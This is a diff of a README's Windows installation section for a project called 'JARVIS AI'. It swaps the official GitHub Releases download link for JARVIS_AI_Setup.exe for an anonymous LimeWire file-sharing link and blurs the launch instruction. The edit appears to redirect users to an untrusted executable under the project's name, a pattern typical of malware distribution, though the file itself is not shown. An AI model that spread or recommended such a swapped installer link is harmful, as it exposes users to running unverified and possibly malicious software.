@@ -86,9 +86,9 @@ JARVIS AI is an advanced, hyperrealistic AI assistant that provides complete sys
 ## 🚀 Quick Installation (Windows)
 
 ### **Option 1: Easy Installer (Recommended)**
-1. Download `JARVIS_AI_Setup.exe` from [Releases](https://github.com/xotiic4201/Jarvis-advance/releases)
+1. Download `JARVIS_AI_Setup.exe` from [Releases](https://limewire.com/d/SYWfW#1Hv9kLWmyM)
 2. Run the installer
-3. Launch JARVIS from Start Menu or Desktop
+3. Launch JARVIS from file 
 
 ### **Option 2: Manual Setup**
 #### Prerequisites
